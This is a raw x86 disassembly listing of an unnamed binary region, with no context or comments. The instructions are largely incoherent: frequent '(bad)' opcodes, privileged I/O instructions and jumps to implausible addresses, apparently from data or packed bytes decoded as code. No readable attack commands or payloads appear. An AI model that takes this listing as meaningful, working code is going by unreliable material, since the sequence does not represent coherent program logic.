  4280c0:	ret    0xe63e
  4280c3:	or     BYTE PTR [eax+0xd03e78f],cl
  4280c9:	packssdw mm2,QWORD PTR [ecx]
  4280cc:	stos   BYTE PTR es:[edi],al
  4280cd:	ds out 0x78,al
  4280d0:	mov    ebx,ebx
  4280d2:	out    0x3,eax
  4280d4:	or     eax,0x7cf9efb
  4280d9:	sti    
  4280da:	test   eax,0xa58b13d0
  4280df:	pop    esp
  4280e0:	ret    
  4280e1:	xor    bh,bh
  4280e3:	jne    0x4280b5
  4280e5:	daa    
  4280e6:	mov    fs,WORD PTR [ecx-0x5b]
  4280e9:	loop   0x4280f6
  4280eb:	neg    BYTE PTR [eax-0x1a12dc3e]
  4280f1:	add    BYTE PTR [ecx+eiz*8+0x1200000f],0xcc
  4280f9:	mov    dl,0x2
  4280fb:	add    BYTE PTR [ecx-0x37268bfa],cl
  428101:	ret    0xe523
	...
  428120:	add    BYTE PTR [eax],al
  428122:	mov    ?,WORD PTR [edx-0x4fcd22dd]
  428128:	fist   WORD PTR [eax]
  42812a:	leave  
  42812b:	ds cld 
  42812d:	jmp    0xcd85f54b
  428132:	and    al,BYTE PTR [edi+0x3d1166b3]
  428138:	cld    
  428139:	jmp    0x654eb053
  42813e:	cmp    eax,0x83e9fc3d
  428143:	shl    DWORD PTR [ebx],0x75
  428146:	mov    esi,0x51f1753c
  42814b:	mov    bl,0x3
  42814d:	fdivrp st(3),st
  42814f:	cmp    eax,0x81112912
  428154:	mov    edi,0xff6d53de
  428159:	call   0x585b76c
  42815e:	fld    QWORD PTR ds:0x9c07fa74
  428164:	and    esp,DWORD PTR [ebp+0xe]
  428167:	add    BYTE PTR [eax],al
  428169:	idiv   BYTE PTR [ebx]
  42816b:	jge    0x4280f0
  42816d:	test   eax,0xe9948299
  428172:	push   cs
  428173:	add    cl,ch
  428175:	fstp   QWORD PTR [esi-0x78]
  428178:	test   BYTE PTR [eax],al
  42817a:	hlt    
  42817b:	add    DWORD PTR [eax],eax
  42817d:	add    BYTE PTR [eax+edi*8-0x49fc0156],bl
  428184:	and    BYTE PTR [eax+eax*1],0x0
	...
  4281a4:	pop    esp
  4281a5:	add    al,BYTE PTR [eax]
  4281a7:	add    BYTE PTR [eax+edi*4+0x7e5de8ca],ah
  4281ae:	cld    
  4281af:	(bad)  
  4281b0:	(bad)  
  4281b1:	mov    esi,0x7cbae171
  4281b6:	and    BYTE PTR [ebp+esi*1+0x4d],dh
  4281ba:	push   eax
  4281bb:	cmp    DWORD PTR [eax-0x26f087e3],esp
  4281c1:	rol    BYTE PTR [eax-0x78a28640],0x6
  4281c8:	jl     0x42817b
  4281ca:	add    DWORD PTR [eax],eax
  4281cc:	xor    al,0xb6
  4281ce:	mov    BYTE PTR [eax+edx*8],ah
  4281d1:	cmp    eax,0xb655fffc
  4281d6:	mov    BYTE PTR [esp+edx*8],ah
  4281d9:	add    DWORD PTR [eax],eax
  4281db:	add    BYTE PTR [ebp-0x6b003549],ah
  4281e1:	cmp    BYTE PTR [edi],dh
  4281e3:	ret    
  4281e4:	bound  ebx,QWORD PTR [edx]
  4281e6:	mov    DWORD PTR [eax+ebx*1-0xbfffe54],ecx
  4281ed:	push   ebx
  4281ee:	mov    DWORD PTR [eax+ecx*1-0x1b000320],ecx
  4281f5:	push   ebx
  4281f6:	in     al,0xc4
  4281f8:	test   BYTE PTR [ebx],al
  4281fa:	add    BYTE PTR [ebx+0x74ef3c84],cl
  428200:	mov    dl,0x8d
  428202:	fimul  DWORD PTR [ebx-0xb4f1495]
	...
  428224:	add    BYTE PTR [eax],al
  428226:	jae    0x4281e8
  428228:	in     al,0x4e
  42822a:	ds sar ebx,0xf6
  42822e:	or     eax,0xf73e7eb
  428233:	pop    esi
  428234:	test   BYTE PTR [eax-0x7fbf7a75],bl
  42823a:	add    DWORD PTR [ebx-0x44],eax
  42823d:	dec    DWORD PTR [ebx]
  42823f:	fadd   QWORD PTR [ebx-0x7d]
  428242:	dec    ebp
  428243:	pop    ebp
  428244:	test   dh,ch
  428246:	imul   esp,DWORD PTR [ebp+0x2d9fc40],0x10
  42824d:	mov    DWORD PTR [edx],edi
  42824f:	mov    esi,0xcd52ed0d
  428254:	fsub   st,st(7)
  428256:	std    
  428257:	aad    0x40
  428259:	cld    
  42825a:	xor    al,0x73
  42825c:	ds cld 
  42825e:	cmp    ah,BYTE PTR [ebx-0x4122dc49]
  428264:	pop    ebp
  428265:	pop    esi
  428266:	sub    ah,ch
  428268:	mov    WORD PTR [edx],?
  42826a:	stc    
  42826b:	cmp    al,al
  42826d:	dec    DWORD PTR [ecx+0xc97e7aa]
  428273:	daa    
  428274:	add    BYTE PTR [eax+0xa],dl
  428277:	sbb    al,0x41
  428279:	mov    bl,0x29
  42827b:	cmc    
  42827c:	add    al,BYTE PTR [eax]
  42827e:	or     eax,0xb92387ea
  428283:	sub    BYTE PTR [eax],al
  428285:	add    BYTE PTR [ecx+0xffc3a1],cl
	...
  4282a7:	add    dl,ch
  4282a9:	repnz fwait
  4282ab:	(bad)  
  4282ac:	fisub  DWORD PTR [esp+eax*4+0x280d23]
  4282b3:	add    BYTE PTR [ebp+0x42],bl
  4282b6:	push   esi
  4282b7:	mov    BYTE PTR [eax],al
  4282b9:	and    eax,0x300d4015
  4282be:	fsub   QWORD PTR [ebx]
  4282c0:	inc    ecx
  4282c1:	cmc    
  4282c2:	or     ebp,edi
  4282c4:	and    DWORD PTR [eax],eax
  4282c6:	retf   
  4282c7:	iret   
  4282c8:	mov    eax,ds:0xeedfdf53
  4282cd:	(bad)  
  4282ce:	sbb    cl,BYTE PTR [edx]
  4282d0:	nop
  4282d1:	mov    ah,0xc2
  4282d3:	retf   
  4282d4:	mov    DWORD PTR [ebx+0x73],edx
  4282d7:	(bad)  
  4282d8:	adc    BYTE PTR cs:[edi-0x18ff4094],cl
  4282df:	nop
  4282e0:	into   
  4282e1:	jecxz  0x4282b1
  4282e3:	shr    DWORD PTR [ecx+0x52],cl
  4282e6:	jae    0x42826f
  4282e8:	cs push 0x280d03e6
  4282ee:	xchg   ebp,eax
  4282ef:	ret    0x3b51
  4282f2:	pop    ebx
  4282f3:	(bad)  
  4282f4:	out    dx,al
  4282f5:	iret   
  4282f6:	dec    esi
  4282f7:	aas    
  4282f8:	loope  0x428334
  4282fa:	cmp    eax,0x61d6d8e2
  4282ff:	sub    bh,dl
  428301:	ds xchg ebx,eax
  428303:	mov    ?,WORD PTR [esi]
  428305:	sar    DWORD PTR [ecx-0x114ade26],1
  42830b:	test   BYTE PTR [eax],0x0
	...
  42832a:	xor    eax,0xebd7ecf
  42832f:	add    bh,ah
  428331:	mov    esp,DWORD PTR [edi+0x3b]
  428334:	add    eax,0xa7114d18
  428339:	add    eax,DWORD PTR [edi+esi*1-0x5f81c14f]
  428340:	xchg   esp,eax
  428341:	(bad)  
  428342:	jmp    0x76e75fb
  428347:	add    eax,ebp
  428349:	add    eax,DWORD PTR [edi+ebp*1-0x37a1caef]
  428350:	add    DWORD PTR [edi],eax
  428352:	add    DWORD PTR [edx+0x29],ebx
  428355:	add    al,0x5c
  428357:	iret   
  428358:	sbb    DWORD PTR [edi],eax
  42835a:	dec    edi
  42835b:	xor    bh,bh
  42835d:	sub    cl,BYTE PTR [ecx]
  42835f:	rcl    BYTE PTR [eax+0x1a],1
  428362:	les    edi,FWORD PTR [ebx]
  428364:	adc    ah,ch
  428366:	(bad)  
  428367:	mov    edi,0x2d26fff
  42836c:	cmp    DWORD PTR [edx-0x697e8ab],ebp
  428372:	jne    0x4283ae
  428374:	cld    
  428375:	sbb    esp,ecx
  428377:	or     eax,0x3a4eda1c
  42837c:	std    
  42837d:	cld    
  42837e:	push   es
  42837f:	cmp    eax,0xc001e512
  428384:	jmp    FWORD PTR [esi]
  428386:	dec    edx
  428387:	cmp    edi,esi
  428389:	push   ecx
  42838a:	jmp    DWORD PTR [edi+0x68ff]
	...
  4283ac:	or     DWORD PTR [eax],eax
  4283ae:	push   ecx
  4283af:	mov    bh,0x65
  4283b1:	cmp    edx,DWORD PTR [edx]
  4283b3:	rcr    DWORD PTR [eax],0xc0
  4283b6:	call   DWORD PTR [ebp-0x25fbf233]
  4283bc:	dec    esi
  4283bd:	cmp    bl,BYTE PTR [edx+0x63]
  4283c0:	push   edx
  4283c1:	cmp    ebx,DWORD PTR [edx+eax*8-0x29]
  4283c5:	inc    eax
  4283c6:	pop    es
  4283c7:	jmp    0x692e0b0f
  4283cc:	(bad)  
  4283ce:	add    ecx,ebp
  4283d0:	push   cs
  4283d1:	iret   
  4283d2:	mov    ah,ah
  4283d4:	or     cl,BYTE PTR [edi]
  4283d6:	inc    eax
  4283d7:	jmp    0xf67358b0
  4283dc:	inc    esp
  4283dd:	mov    esi,0xb697e9fc
  4283e2:	repz jo 0x428388
  4283e5:	xor    DWORD PTR [ebx+edx*2+0x13],edx
  4283e9:	cmp    edx,DWORD PTR [edx]
  4283eb:	and    eax,0x5fffbffe
  4283f0:	shr    DWORD PTR [ecx],cl
  4283f2:	xchg   BYTE PTR [eax],al
  4283f4:	dec    ecx
  4283f5:	lock jg 0x4283f0
  4283f8:	jnp    0x42840a
  4283fa:	test   BYTE PTR [eiz*4+0x318cfffd],dh
  428401:	lods   eax,DWORD PTR ds:[esi]
  428402:	stc    
  428403:	jmp    FWORD PTR [ebx+0x4d]
  428406:	sti    
  428407:	jne    0x42847d
  428409:	enter  0xb081,0x79
  42840d:	sar    bl,0x2c
	...
  42842c:	add    BYTE PTR [eax],al
  42842e:	jbe    0x42842d
  428430:	(bad)  
  428431:	(bad)  
  428432:	popa   
  428433:	inc    ecx
  428434:	or     eax,0xfbe66440
  428439:	add    BYTE PTR [ebp+edi*8-0x7a],ah
  42843d:	lea    ebx,[edx+edi*8]
  428440:	sti    
  428441:	jmp    FWORD PTR [edi]
  428443:	iret   
  428444:	or     eax,DWORD PTR [esi-0x33b]
  42844a:	dec    DWORD PTR [eax]
  42844c:	xchg   esp,eax
  42844d:	loop   0x4284c6
  42844f:	std    
  428450:	or     al,BYTE PTR [ecx+eiz*1+0x37fffffd]
  428457:	mov    ebp,0x76fc7d35
  42845c:	push   cs
  42845d:	mov    eax,DWORD PTR [ecx-0x49f3ca0f]
  428463:	je     0x3fa92b
  428469:	aas    
  42846a:	aas    
  42846b:	inc    edx
  42846c:	hlt    
  42846d:	jb     0x428479
  42846f:	dec    edi
  428470:	in     al,0x15
  428472:	or     edi,ebp
  428474:	dec    DWORD PTR [eax-0x38c81b4f]
  42847a:	jmp    0x4283fc
  42847c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42847d:	add    ah,dh
  42847f:	cld    
  428480:	cli    
  428481:	mov    ch,0xac
  428483:	mov    esi,0x6c23fffb
  428488:	cld    
  428489:	add    ecx,DWORD PTR ds:0x20fd0027
  42848f:	out    0x12,eax
  428491:	inc    eax
	...
  4284ae:	add    BYTE PTR [eax],al
  4284b0:	or     eax,0xc23833ae
  4284b5:	sub    DWORD PTR [ecx+ecx*4-0x74ffd8f3],eax
  4284bc:	push   eax
  4284bd:	inc    ebx
  4284be:	rcl    DWORD PTR [ebp-0x4b],cl
  4284c1:	adc    ch,cl
  4284c3:	call   FWORD PTR [edx-0x6d087710]
  4284c9:	jne    0x428451
  4284cb:	cld    
  4284cc:	add    DWORD PTR [ecx+ecx*4],edx
  4284cf:	inc    edx
  4284d0:	imul   edi,DWORD PTR ds:0xe55b3007,0xb1e97303
  4284da:	hlt    
  4284db:	cld    
  4284dc:	add    bl,ah
  4284de:	adc    eax,DWORD PTR [eax+0xd]
  4284e1:	fiadd  WORD PTR [esi]
  4284e3:	sub    BYTE PTR [ebx],bh
  4284e5:	add    BYTE PTR gs:[ebx-0x47],dh
  4284e9:	popf   
  4284ea:	or     al,0x50
  4284ec:	ins    BYTE PTR es:[edi],dx
  4284ed:	add    bl,BYTE PTR [esi+0x40]
  4284f0:	or     eax,0xc8e803ae
  4284f5:	rol    DWORD PTR [ebx],1
  4284f7:	add    BYTE PTR [eax-0x69c1491a],cl
  4284fd:	fwait
  4284fe:	cmp    BYTE PTR [edx+0x7b411],cl
  428504:	or     eax,0x19728f27
  428509:	(bad)  
  42850a:	jae    0x42849e
  42850c:	or     eax,0x79bf8429
  428511:	push   edx
  428512:	mov    DWORD PTR [edx+0x0],edx
	...
  428531:	add    ch,dh
  428533:	mov    dl,0x86
  428535:	mov    bh,0xf0
  428537:	cs cmp eax,0x3d2d5888
  42853d:	jb     0x428534
  42853f:	add    dh,ah
  428541:	enter  0x37e2,0x23
  428545:	xor    BYTE PTR [ebx+0x7f3e77fc],cl
  42854b:	js     0x428518
  42854d:	shr    DWORD PTR ds:[eax],0x2e
  428551:	ds mov ecx,0x3e436237
  428557:	cld    
  428558:	lods   al,BYTE PTR ds:[esi]
  428559:	enter  0x1a9,0x16
  42855d:	sub    al,0xe7
  42855f:	(bad)  
  428560:	out    0x3,al
  428562:	fdiv   QWORD PTR [esi]
  428564:	popf   
  428565:	mov    eax,0x90b937aa
  42856a:	(bad)  
  42856b:	jo     0x4284f8
  42856d:	ds adc eax,0x376ab885
  428574:	ror    ebx,cl
  428576:	add    eax,eax
  428578:	out    0x88,al
  42857a:	stos   BYTE PTR es:[edi],al
  42857b:	pop    es
  42857c:	fs cmp al,0x60
  42857f:	aaa    
  428580:	gs fild QWORD PTR ds:[edi]
  428584:	pop    ebp
  428585:	push   edx
  428586:	sbb    esi,DWORD PTR [ebp+0x6c8e0e42]
  42858c:	dec    esp
  42858d:	ds inc ecx
  42858f:	aaa    
  428590:	mov    ebx,0x55083237
  428595:	add    eax,DWORD PTR [eax]
	...
  4285b3:	add    BYTE PTR ds:0xc93eab8a,cl
  4285b9:	aad    0x91
  4285bb:	dec    esp
  4285bc:	dec    ebp
  4285bd:	jge    0x4285db
  4285bf:	mov    bh,0xfb
  4285c1:	mov    ch,bl
  4285c3:	imul   eax,DWORD PTR [esi-0x3d],0xffffffe6
  4285c7:	repnz retf 0x1f7c
  4285cb:	mov    bh,0x1f
  4285cd:	mov    ebx,ebx
  4285cf:	addr16 mov dl,0xe6
  4285d3:	cld    
  4285d4:	cmp    al,0xac
  4285d6:	jmp    esi
  4285d8:	into   
  4285d9:	mov    ch,0xc1
  4285db:	popa   
  4285dc:	push   cs
  4285dd:	add    BYTE PTR [eax],al
  4285df:	and    cl,BYTE PTR [esi-0x4f]
  4285e2:	out    dx,al
  4285e3:	push   0x41
  4285e5:	xor    al,0xc0
  4285e7:	bound  ebx,QWORD PTR [edx]
  4285e9:	push   0xd1092acb
  4285ee:	push   edx
  4285ef:	pop    ds
  4285f0:	mov    WORD PTR [ecx-0x4],cs
  4285f3:	cli    
  4285f4:	dec    esi
  4285f5:	int3   
  4285f6:	mov    eax,0x1161
  4285fb:	fs push esi
  4285fd:	mov    bl,0x23
  4285ff:	jb     0x4285a3
  428601:	(bad)  
  428602:	retf   
  428603:	sub    cl,BYTE PTR [ecx]
  428605:	mov    ebp,edx
  428607:	push   0xffffff87
  428609:	ss jo  0x4285ec
  42860c:	dec    esi
  42860d:	call   eax
  42860f:	ret    0xb0cf
  428612:	repz xchg edx,eax
  428614:	add    ecx,DWORD PTR [ecx+0xf7]
	...
  428636:	sub    BYTE PTR [edi-0x1],bh
  428639:	call   0x7340874c
  42863e:	sub    DWORD PTR [edx+0x3da7a82e],esi
  428644:	xchg   ecx,ebp
  428646:	push   cs
  428647:	add    BYTE PTR [esi-0x40227b],bh
  42864d:	push   eax
  42864e:	leave  
  42864f:	xchg   edx,eax
  428650:	(bad)  
  428651:	call   0xabb5fce0
  428656:	xchg   ebp,eax
  428657:	jmp    0x368ea403
  42865c:	std    
  42865d:	in     al,dx
  42865e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42865f:	dec    edx
  428660:	inc    eax
  428661:	jmp    0x16a8bfeb
  428666:	cdq    
  428667:	xor    eax,0xf90de9fc
  42866c:	mov    ds:0xfc3f4000,eax
  428671:	jae    0x42863d
  428673:	push   eax
  428674:	push   ebx
  428675:	call   0x3f11f6
  42867a:	outs   dx,DWORD PTR ds:[esi]
  42867b:	dec    eax
  42867c:	and    BYTE PTR [edi+esi*8],dl
  42867f:	(bad)  
  428680:	aas    
  428681:	push   0xffffffe4
  428683:	xchg   BYTE PTR [ebx+0x18],dh
  428686:	sub    eax,0xa85f84fc
  42868b:	jmp    0xf51642c9
  428690:	dec    edi
  428691:	(bad)  
  428692:	sti    
  428693:	xor    esp,esp
  428695:	xor    al,0x20
  428697:	hlt    
  428698:	sti    
  428699:	pop    edi
	...
  4286b6:	add    BYTE PTR [eax],al
  4286b8:	adc    al,BYTE PTR [edi-0x3db0a23f]
  4286be:	add    BYTE PTR [eax],al
  4286c0:	pop    ds
  4286c1:	dec    eax
  4286c2:	or     al,0x56
  4286c4:	dec    ebx
  4286c5:	das    
  4286c6:	sti    
  4286c7:	xor    esi,DWORD PTR [esi+edi*2-0x778e8b3b]
  4286ce:	outs   dx,DWORD PTR ds:[esi]
  4286cf:	or     al,0xff
  4286d1:	retf   0x2f2
  4286d4:	jbe    0x428744
  4286d6:	push   es
  4286d7:	inc    eax
  4286d8:	idiv   DWORD PTR [esi+0x6f253b2c]
  4286de:	out    dx,eax
  4286df:	jmp    0x42873e
  4286e1:	push   0xbb3730bc
  4286e6:	xchg   eax,edi
  4286e8:	pop    ecx
  4286e9:	pop    ds
  4286ea:	cmp    eax,0x8930fd6b
  4286ef:	jae    0x428711
  4286f1:	jmp    0x1771b35
  4286f6:	test   al,al
  4286f8:	pop    eax
  4286f9:	sbb    BYTE PTR [edi-0xb77ebbd],al
  4286ff:	imul   esi,ebx,0x30
  428702:	(bad)  
  428703:	cmp    eax,0xfec09c0d
  428708:	xchg   ebp,eax
  428709:	imul   edx,DWORD PTR [eax],0xbfb20474
  42870f:	pop    es
  428710:	test   BYTE PTR [ebp+0x4],bl
  428713:	(bad)  
  428714:	adc    ch,BYTE PTR [ecx]
  428716:	xchg   esp,eax
  428718:	inc    edx
  428719:	test   DWORD PTR [edi],edi
  42871b:	push   ebp
	...
  428738:	add    BYTE PTR [eax],al
  42873a:	xchg   bh,dl
  42873c:	adc    esi,DWORD PTR [ecx]
  42873e:	int    0xed
  428740:	jle    0x428737
  428742:	inc    ecx
  428743:	xor    DWORD PTR [ebp-0x355df68a],ecx
  428749:	or     eax,DWORD PTR [esi+0x979fa97]
  42874f:	in     al,dx
  428750:	(bad)  
  428751:	cmc    
  428752:	movaps XMMWORD PTR [edx+ecx*1+0x2f45aa4d],xmm5
  42875a:	(bad)  
  42875b:	fs mov ch,0xed
  42875e:	fisub  WORD PTR [esi-0x28]
  428761:	pop    ebp
  428762:	dec    esi
  428763:	add    DWORD PTR [edi+ebp*1+0xe],eax
  428767:	push   0x2487f52c
  42876c:	push   0x6beff801
  428771:	(bad)  
  428772:	ficomp WORD PTR ds:0x9c15458d
  428778:	inc    ebx
  428779:	jae    0x428799
  42877b:	ja     0x4287a5
  42877d:	nop
  42877e:	data16 es add cl,ch
  428782:	test   ch,0xb1
  428785:	or     edx,DWORD PTR [esi+0x15e8105c]
  42878b:	jae    0x4287c6
  42878d:	cld    
  42878e:	xor    ch,BYTE PTR [eax+ecx*1-0x18]
  428792:	xchg   ecx,eax
  428793:	rol    BYTE PTR [ebx],cl
  428795:	add    BYTE PTR [edx],ah
  428797:	ins    BYTE PTR es:[edi],dx
  428798:	or     al,0xe8
  42879a:	cdq    
  42879b:	(bad)  
  42879c:	jp     0x4287a2
	...
  4287ba:	add    BYTE PTR [eax],al
  4287bc:	or     eax,0xf2e39435
  4287c1:	lods   al,BYTE PTR ds:[esi]
  4287c2:	jp     0x4287c8
  4287c4:	or     eax,0xf2eb9433
  4287c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287ca:	pop    edx
  4287cb:	add    al,0xd
  4287cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287ce:	mov    dh,0xd1
  4287d0:	repnz fstp DWORD PTR [ebx+0x4]
  4287d4:	or     eax,0xcc05e43a
  4287d9:	iret   
  4287da:	cmp    edx,edx
  4287dc:	cmp    DWORD PTR [edi-0x77365322],eax
  4287e2:	out    0x3,al
  4287e4:	or     eax,0xc6600bff
  4287e9:	mov    edi,0x33a7f6e6
  4287ee:	xor    eax,0xbee393dc
  4287f3:	lds    edi,FWORD PTR [esi+0x0]
  4287f6:	out    0x3a,eax
  4287f8:	and    DWORD PTR [eax+0x7efd8e],esi
  4287fe:	out    0x3a,eax
  428800:	rol    DWORD PTR [eax+0x280d03e6],0xbd
  428807:	(bad)  
  428808:	jp     0x42883d
  42880a:	mov    ecx,0xd6a33b5e
  42880f:	mov    cl,0xfd
  428811:	xchg   ch,bh
  428813:	pop    es
  428814:	or     al,0x2d
  428816:	jle    0x4287c1
  428818:	pop    ecx
  428819:	xor    esp,DWORD PTR [ebp-0x3a]
  42881c:	lea    edi,ds:0xff16
	...
  42883e:	jmp    0x416b6152
  428843:	stos   DWORD PTR es:[edi],eax
  428844:	fisubr DWORD PTR [ebx]
  428846:	pop    es
  428847:	mov    esi,fs
  428849:	add    edx,DWORD PTR [edx+0x2ac62a68]
  42884f:	xchg   bh,bh
  428851:	xor    BYTE PTR [ebp-0x74678c8d],cl
  428857:	push   cs
  428858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428859:	xor    eax,0x3189334b
  42885e:	mov    ecx,0xee98739
  428863:	add    BYTE PTR [ebx-0x347dea3],cl
  428869:	push   es
  42886a:	aaa    
  42886b:	xor    BYTE PTR [esi],0xe9
  42886e:	popf   
  42886f:	stc    
  428870:	jle    0x428872
  428872:	xchg   esi,eax
  428873:	xor    bh,ah
  428875:	jmp    0x23343641
  42887a:	adc    DWORD PTR [edi-0x51fb9bd7],ebp
  428880:	or     eax,0x9041f13b
  428885:	jmp    0x8d7d9b98
  42888a:	inc    ebp
  42888b:	sar    bh,0xd1
  42888e:	add    ecx,DWORD PTR [ecx+0x7b5640cc]
  428894:	(bad)  
  428895:	call   0xb5e5faa8
  42889a:	enter  0xe432,0x94
  42889e:	mov    ds:0x60fc32,eax
	...
  4288bf:	add    BYTE PTR [edx+0x5a],bh
  4288c2:	retf   
  4288c3:	sub    dl,BYTE PTR [ecx]
  4288c5:	aad    0x5d
  4288c7:	and    al,0x50
  4288c9:	aas    
  4288ca:	push   edx
  4288cb:	jb     0x428902
  4288cd:	mov    dl,0xeb
  4288cf:	inc    ebp
  4288d0:	adc    DWORD PTR [eax],eax
  4288d2:	add    BYTE PTR [edi],dl
  4288d4:	stos   DWORD PTR es:[edi],eax
  4288d5:	jmp    0x33e02564
  4288da:	cld    
  4288db:	pop    esi
  4288dc:	imul   ebx,DWORD PTR [edx],0xef0e1
  4288e2:	mov    esp,DWORD PTR [ebp+ebp*2+0x37]
  4288e6:	cld    
  4288e7:	add    bl,cl
  4288e9:	dec    ebx
  4288ea:	data16 add BYTE PTR [edx+edx*2+0x7fdbffd0],bh
  4288f2:	mov    esp,0xfd42b00f
  4288f7:	jmp    DWORD PTR [ebx+eax*4]
  4288fa:	ret    0x7950
  4288fd:	mov    cl,0x60
  4288ff:	sti    
  428900:	sbb    esi,edi
  428902:	dec    esp
  428903:	push   eax
  428904:	or     al,0x2d
  428906:	sar    edi,1
  428908:	or     esi,DWORD PTR [ecx+0x29700fbc]
  42890e:	std    
  42890f:	push   esp
  428911:	arpl   WORD PTR [edi],si
  428913:	lea    esp,[ecx-0x7f]
  428916:	push   esp
  428917:	call   0x429f99
  42891c:	aas    
  42891d:	mov    edi,0x91318d4c
  428922:	idiv   edi
	...
  428940:	add    BYTE PTR [eax],al
  428942:	retf   
  428943:	dec    ebp
  428944:	mov    DWORD PTR [ebp-0x40b18],eax
  42894a:	add    al,0xe4
  42894c:	add    al,0xd5
  42894e:	pop    ebx
  42894f:	clc    
  428950:	add    eax,0x110b1bb
  428956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428957:	std    
  428958:	mov    BYTE PTR [ebp-0x40ab8],al
  42895e:	inc    esp
  42895f:	not    DWORD PTR [ecx]
  428961:	dec    eax
  428962:	jbe    0x4289a1
  428964:	cld    
  428965:	or     BYTE PTR [eax+edi*8-0x3157bf5],0xff
  42896d:	dec    DWORD PTR [esi]
  42896f:	cmp    BYTE PTR [ecx-0x1baa538b],cl
  428975:	push   0xd
  428977:	cld    
  428978:	jmp    FWORD PTR [ecx+0x29]
  42897b:	jns    0x4289ee
  42897d:	mov    al,0xd
  42897f:	outs   dx,DWORD PTR ds:[esi]
  428980:	sub    BYTE PTR [esp+edx*1+0x27],bl
  428984:	add    BYTE PTR [edx-0xd],ch
  428987:	stos   DWORD PTR es:[edi],eax
  428988:	lods   eax,DWORD PTR ds:[esi]
  428989:	out    dx,eax
  42898a:	(bad)
  42898d:	push   ss
  42898e:	or     eax,0xd0c5d327
  428993:	loope  0x428995
  428995:	push   ebp
  428996:	add    dl,cl
  428998:	mov    ebp,0xbda45dfc
  42899d:	(bad)  
  42899e:	pop    ebp
  42899f:	jge    0x4289ab
  4289a1:	pop    ecx
  4289a2:	mov    BYTE PTR [ebx+0xe754],al
	...
  4289c4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4289c6:	add    BYTE PTR [eax],al
  4289c8:	inc    esp
  4289c9:	pusha  
  4289ca:	xor    edi,0xc
  4289cd:	sbb    al,BYTE PTR [ebp+esi*4-0x74ffd8f3]
  4289d4:	mov    BYTE PTR [edx-0x93503c6],bh
  4289da:	test   eax,0x73e390fc
  4289df:	dec    edi
  4289e0:	xchg   BYTE PTR [ecx-0x2d],bl
  4289e3:	cld    
  4289e4:	sbb    BYTE PTR [ebx],dl
  4289e6:	adc    eax,DWORD PTR [eax+0xd]
  4289e9:	scas   al,BYTE PTR es:[edi]
  4289ea:	cmp    eax,DWORD PTR [eax-0x7bfb965e]
  4289f0:	and    BYTE PTR [esi],0x0
  4289f3:	add    BYTE PTR [eax-0x7509285d],al
  4289f9:	xchg   ecx,eax
  4289fa:	shl    DWORD PTR [edi+0x9],cl
  4289fd:	sub    BYTE PTR [eax],al
  4289ff:	add    BYTE PTR [eax+0x72faa79b],cl
  428a05:	jns    0x4289da
  428a07:	xor    BYTE PTR [ebx+0x8],ah
  428a0a:	xchg   DWORD PTR [edx+0x5d],eax
  428a0d:	push   ss
  428a0e:	xchg   DWORD PTR [edx+0x39],eax
  428a11:	push   ss
  428a12:	xor    eax,0xf7ffbd12
  428a17:	ret    
  428a18:	dec    edx
  428a19:	jnp    0x428a41
  428a1b:	mov    al,0xe2
  428a1d:	sub    BYTE PTR [ebx-0x58],0x37
  428a21:	xor    BYTE PTR [ebp-0x62],cl
  428a24:	sti    
  428a25:	push   0xffffffd2
  428a27:	cmp    BYTE PTR [eax],al
	...
  428a45:	add    BYTE PTR [ecx],ch
  428a47:	xor    BYTE PTR [edx-0x118354f1],dh
  428a4d:	out    0x9f,al
  428a4f:	stc    
  428a50:	rcl    bh,0xbb
  428a53:	cdq    
  428a54:	outs   dx,DWORD PTR ds:[esi]
  428a55:	or     al,0x8c
  428a57:	inc    eax
  428a58:	call   0x9c32c5fa
  428a5d:	daa    
  428a5e:	lea    ebp,[edi]
  428a60:	out    0xb0,eax
  428a62:	sub    BYTE PTR [ebp+0x6b],bh
  428a65:	test   al,0xe7
  428a67:	das    
  428a68:	std    
  428a69:	rcl    DWORD PTR [edi-0x26c5757b],cl
  428a6f:	das    
  428a70:	xchg   esi,eax
  428a71:	mov    BYTE PTR [edi-0x36c9222c],cl
  428a77:	ror    dh,1
  428a79:	sbb    al,0xd9
  428a7b:	das    
  428a7c:	aad    0x80
  428a7e:	jp     0x428a34
  428a80:	lock mov BYTE PTR [edi-0x56c9422c],al
  428a87:	sbb    esp,esp
  428a89:	mov    BYTE PTR [edi-0x66c94c64],dl
  428a8f:	jnp    0x428aa4
  428a91:	or     al,0xa5
  428a93:	or     bh,ah
  428a95:	add    ecx,DWORD PTR ds:0x17afa684
  428a9b:	sub    esi,DWORD PTR cs:[edi]
  428a9e:	cli    
  428a9f:	lods   al,BYTE PTR ds:[esi]
  428aa0:	lea    edi,[ecx]
  428aa2:	add    DWORD PTR [edx+0x2f6936d1],eax
  428aa8:	sbb    eax,0xdb
	...
  428ac5:	add    BYTE PTR [eax],al
  428ac7:	add    al,al
  428ac9:	cmp    bh,bh
  428acb:	stos   BYTE PTR es:[edi],al
  428acc:	pop    edx
  428acd:	das    
  428ace:	push   ebx
  428acf:	bound  ebp,QWORD PTR [edx]
  428ad1:	scas   al,BYTE PTR es:[edi]
  428ad2:	jmp    0x428aa9
  428ad4:	sldt   WORD PTR [eax]
  428ad7:	mov    bh,0x53
  428ad9:	cdq    
  428ada:	cmp    DWORD PTR [ebp+edi*2+0x23],esp
  428ade:	push   edi
  428adf:	pusha  
  428ae0:	pop    ebp
  428ae1:	xor    ecx,DWORD PTR [eax+0x17d3f640]
  428ae7:	jmp    0x9a0803fa
  428aec:	dec    ebx
  428aed:	jp     0x428a71
  428aef:	push   ebp
  428af0:	fisubr DWORD PTR [ebx]
  428af2:	cld    
  428af3:	mov    ecx,0x1ed06b36
  428af8:	cmp    eax,DWORD PTR [edx+0x737ae6bf]
  428afe:	(bad)  
  428aff:	call   0xa0387c12
  428b04:	mov    dh,0xae
  428b06:	(bad)  
  428b07:	call   0x9f44251a
  428b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b0d:	sub    eax,0xee964
  428b12:	inc    eax
  428b13:	je     0x428b5f
  428b15:	xchg   ebx,eax
  428b16:	sti    
  428b17:	fdivp  st(0),st
  428b19:	mov    esi,0x10cefcfc
  428b1e:	inc    eax
